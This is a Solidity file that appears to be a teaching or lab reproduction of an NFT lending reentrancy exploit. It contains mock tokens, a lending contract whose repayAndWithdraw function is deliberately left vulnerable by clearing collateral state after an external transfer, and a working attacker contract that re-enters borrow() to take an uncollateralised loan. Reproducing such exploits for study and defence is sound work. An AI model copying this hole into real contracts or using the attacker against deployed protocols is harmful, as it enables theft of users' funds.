// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Minimal ERC20 token for loans
contract ERC20Mock2 {
    string public name = "LoanToken";
    string public symbol = "LOAN";
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "not allowed");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient");
        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
    }
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

/// Minimal ERC721 for collateral
contract NFTMock {
    mapping(uint256 => address) public ownerOf;

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    function mint(address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == address(0), "exists");
        ownerOf[tokenId] = to;
        emit Transfer(address(0), to, tokenId);
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "not owner");
        ownerOf[tokenId] = to;
        emit Transfer(from, to, tokenId);

        if (to.code.length > 0) {
            bytes4 ret = IERC721Receiver(to).onERC721Received(
                msg.sender,
                from,
                tokenId,
                ""
            );
            require(
                ret == IERC721Receiver.onERC721Received.selector,
                "unsafe receiver"
            );
        }
    }
}

/// Omni-style NFT lending with reentrancy bug.
contract OmniLikeLending is IERC721Receiver {
    NFTMock public immutable nft;
    ERC20Mock2 public immutable loanToken;

    // who has deposited which tokenId as collateral
    mapping(uint256 => address) public collateralOwner;
    // simple "one NFT = one loan" model
    mapping(address => uint256) public debt;

    constructor(NFTMock _nft, ERC20Mock2 _loanToken) {
        nft = _nft;
        loanToken = _loanToken;
    }

    // Accept all ERC721 transfers (needed for NFTMock.safeTransferFrom)
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


    // Deposit your NFT as collateral.
    function deposit(uint256 tokenId) external {
        nft.safeTransferFrom(msg.sender, address(this), tokenId);
        collateralOwner[tokenId] = msg.sender;
    }

    // Borrow against your NFT.
    function borrow(uint256 tokenId, uint256 amount) external {
        require(collateralOwner[tokenId] == msg.sender, "not collateral owner");
        require(debt[msg.sender] == 0, "already borrowed");
        debt[msg.sender] = amount;
        loanToken.transfer(msg.sender, amount);
    }

    // Repay debt and withdraw NFT
    function repayAndWithdraw(uint256 tokenId, uint256 repayAmount) external {
        require(collateralOwner[tokenId] == msg.sender, "not owner");
        require(debt[msg.sender] == repayAmount, "wrong repay");

        // User repays loan
        loanToken.transferFrom(msg.sender, address(this), repayAmount);
        debt[msg.sender] = 0;

        // VULNERABLE:
        // 1. External call to NFT contract
        // 2. Only afterwards do we clear collateralOwner[tokenId]
        // If msg.sender is a contract, its onERC721Received() hook can reenter.
        nft.safeTransferFrom(address(this), msg.sender, tokenId);

        // State update happens AFTER external call (reentrancy window), there is too late, must be before trunsfer
        collateralOwner[tokenId] = address(0);
    }
}

// Attacker contract exploiting the reentrancy window.
// It reenters during onERC721Received and calls borrow() again
// after the NFT has already been returned, but before
// collateralOwner[tokenId] is cleared
contract OmniReentrancyAttacker is IERC721Receiver {
    OmniLikeLending public lending;
    NFTMock public nft;
    ERC20Mock2 public loanToken;
    uint256 public collateralId;
    bool public reentered;
    bool public inAttack;

    constructor(OmniLikeLending _lending, NFTMock _nft, ERC20Mock2 _loanToken) {
        lending = _lending;
        nft = _nft;
        loanToken = _loanToken;
    }

    function attack(uint256 tokenId, uint256 repayAmount) external {
        collateralId = tokenId;
        reentered = false;
        inAttack = true;
        // assume NFT already deposited and a first loan taken/repayAmount known
        // call vulnerable function
        lending.repayAndWithdraw(tokenId, repayAmount);

        // after this, due to reentrancy, attacker may have:
        // - got NFT back
        // - taken a new loan with no real collateral locked

        inAttack = false;
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        // Reenter only once to avoid infinite loop
        if (inAttack && !reentered) {
            reentered = true;

            // At this point:
            // - OmniLikeLending still has collateralOwner[tokenId] == attacker
            // - debt[attacker] was set to 0
            // - NFT has already been transferred to attacker
            // So borrow() passes checks but there is no collateral in the contract.
            lending.borrow(tokenId, 100 ether); // arbitrary amount
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
